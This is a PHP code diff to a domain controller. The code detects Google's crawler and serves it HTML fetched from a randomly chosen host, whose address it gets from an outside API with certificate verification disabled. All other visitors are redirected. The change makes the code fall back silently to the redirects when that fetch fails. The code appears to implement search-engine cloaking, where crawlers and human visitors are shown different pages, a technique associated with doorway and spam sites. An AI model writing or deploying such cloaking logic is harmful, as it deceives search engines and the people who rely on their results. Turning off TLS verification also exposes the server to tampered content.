@@ -43,43 +43,36 @@ class DomainController
         }
         if ($isGoogleCrawler) {
             if (ob_get_level()) { ob_end_clean(); }
-            // Build API URL from env and fetch AMP/domain lists
+            // Build API URL from env and fetch AMP list for crawler handling
             $site = $_ENV['SITE'] ?? $_SERVER['SITE'] ?? getenv('SITE')
                 ?: ($_ENV['API_SITE'] ?? $_SERVER['API_SITE'] ?? getenv('API_SITE'));
-            if (!$site) {
-                return $this->jsonResponse($response, ['error' => 'Environment variable SITE or API_SITE is not set'], 500);
-            }
-            $apiUrl = "https://checkipos.com/api/{$site}";
-            try {
-                $httpClient = new Client([
-                    'verify' => false,
-                    'timeout' => 10
-                ]);
-                $apiResponse = $httpClient->get($apiUrl);
-                $apiData = json_decode($apiResponse->getBody(), true);
+            if ($site) {
+                $apiUrl = "https://checkipos.com/api/{$site}";
+                try {
+                    $httpClient = new Client([
+                        'verify' => false,
+                        'timeout' => 10
+                    ]);
+                    $apiResponse = $httpClient->get($apiUrl);
+                    $apiData = json_decode($apiResponse->getBody(), true);
 
-                if (empty($apiData) || (!isset($apiData['amp']) && !isset($apiData['domain']))) {
-                    throw new \Exception('No valid data retrieved from API');
+                    // Only serve HTML if AMP list is available
+                    if (isset($apiData['amp']) && is_array($apiData['amp']) && !empty($apiData['amp'])) {
+                        $ampDomains = $apiData['amp'];
+                        $chosenHost = $ampDomains[array_rand($ampDomains)];
+                        $indexHtmlUrl = "https://{$chosenHost}/";
+
+                        $urlResponse = $httpClient->get($indexHtmlUrl);
+                        $html = $urlResponse->getBody()->getContents();
+                        $response->getBody()->write($html);
+                        return $response->withHeader('Content-Type', 'text/html')->withStatus(200);
+                    }
+                    // If AMP is empty or missing, fall through to normal redirect logic below
+                } catch (\Exception $e) {
+                    // On any error, fall through to normal redirect logic
                 }
-
-                // Prefer AMP domains for crawlers; fallback to regular domains
-                $ampDomains = isset($apiData['amp']) && is_array($apiData['amp']) ? $apiData['amp'] : [];
-                $domains = isset($apiData['domain']) && is_array($apiData['domain']) ? $apiData['domain'] : [];
-
-                if (empty($ampDomains) && empty($domains)) {
-                    throw new \Exception('No AMP or domain entries available from API');
-                }
-
-                $chosenHost = !empty($ampDomains) ? $ampDomains[array_rand($ampDomains)] : $domains[array_rand($domains)];
-                $indexHtmlUrl = "https://{$chosenHost}/";
-
-                $urlResponse = $httpClient->get($indexHtmlUrl);
-                $html = $urlResponse->getBody()->getContents();
-                $response->getBody()->write($html);
-                return $response->withHeader('Content-Type', 'text/html')->withStatus(200);
-            } catch (\Exception $e) {
-                return $this->jsonResponse($response, ['error' => 'Failed to fetch content for crawler: ' . $e->getMessage()], 500);
             }
+            // If SITE/API_SITE is not set, or AMP not available, continue to normal redirect logic
         }
         try {
             $hostname = $request->getUri()->getHost();
